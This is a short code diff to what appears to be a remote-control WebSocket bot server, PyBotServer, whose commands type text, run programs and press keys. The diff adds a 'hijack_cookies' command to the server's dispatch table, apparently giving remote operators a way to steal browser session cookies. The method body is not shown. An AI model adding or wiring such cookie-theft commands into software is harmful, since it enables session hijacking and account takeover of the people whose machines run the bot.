@@ -20,7 +20,8 @@ class PyBotServer:
             'type_text': self.type_text,
             'run_program': self.run_program,
             'press': self.press_key,
-            'hotkey': self.hotkey_action
+            'hotkey': self.hotkey_action,
+            'hijack_cookies': self.hijack_cookies
         }
         logging.info(f"WebSocket Server initialized on {self.host}:{self.port}")
 
